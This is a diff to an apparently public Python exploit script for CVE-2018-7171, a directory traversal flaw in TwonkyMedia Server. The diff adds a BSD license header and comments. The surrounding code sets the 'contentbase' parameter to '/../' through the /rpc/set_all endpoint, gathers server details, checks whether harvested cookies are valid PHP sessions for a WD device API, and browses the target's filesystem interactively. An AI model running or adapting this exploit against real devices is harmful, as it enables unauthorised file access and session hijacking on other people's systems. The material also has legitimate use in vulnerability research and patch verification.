@@ -1,7 +1,52 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 '''
-author: @mezdanak, modzero AG, https://www.modzero.ch, @mod0
+* ------------------------------------------------------------------------------
+ *
+ * This file is part of: TwonkyMedia Server 7.0.11-8.5 Directory Traversal CVE-2018-7171
+ *
+ * ------------------------------------------------------------------------------
+ *
+ * BSD 3-Clause License
+ *
+ * Copyright (c) 2018, Sven Fassbender
+ * Author: Sven Fassbender
+ * All rights reserved.
+ *
+ * Redistribution and use in source and binary forms, with or without
+ * modification, are permitted provided that the following conditions are met:
+ *
+ * * Redistributions of source code must retain the above copyright notice, this
+ *   list of conditions and the following disclaimer.
+ *
+ * * Redistributions in binary form must reproduce the above copyright notice,
+ *   this list of conditions and the following disclaimer in the documentation
+ *   and/or other materials provided with the distribution.
+ *
+ * * Neither the name of the copyright holder nor the names of its
+ *   contributors may be used to endorse or promote products derived from
+ *   this software without specific prior written permission.
+ *
+ * * NON-MILITARY-USAGE CLAUSE
+ *   Redistribution and use in source and binary form for military use and
+ *   military research is not permitted. Infringement of these clauses may
+ *   result in publishing the source code of the utilizing applications and
+ *   libraries to the public. As this software is developed, tested and
+ *   reviewed by *international* volunteers, this clause shall not be refused
+ *   due to the matter of *national* security concerns.
+ *  
+ * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+ * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+ * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+ * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+ * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+ * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+ * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+ * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+ * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+ * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+ *
+ * ------------------------------------------------------------------------------
 '''
 try:
 	import urllib3
@@ -32,6 +77,7 @@ def checkPort(host, port):
         except:
                 return False
 
+# Patch the contentbase parameter
 def setContentBase(host, port):
         payload = "\ncontentbase=/../\n"
         url = "http://{0}:{1}/rpc/set_all".format(host, port)
@@ -53,6 +99,7 @@ def setContentBase(host, port):
                 print (Fore.MAGENTA + "*** 'contentbase' path set to '/../' ***")
                 return True
 
+# Get some information about the target device
 def serverInfo(host, port):
         print (Fore.MAGENTA + "*** Get Serverdetails from Twonky ***")
         try:
@@ -96,6 +143,7 @@ def serverInfo(host, port):
                                 print (Fore.GREEN + "Videos shared: {0}".format(videoCount))
         return versionNumber
 
+# Check if the discovered Cookie is a valid PHP Session identifier for WD api
 def checkSessionCookie(host, cookieString):
         url = "http://{0}/api/2.1/rest/device_user".format(host)
         cookieTemp = cookieString.split("_")
@@ -106,6 +154,7 @@ def checkSessionCookie(host, cookieString):
         else:
                 return False
 
+# Function for browsing
 def browser(host, port, version):
         while True:
                 var = raw_input("path nr: ")
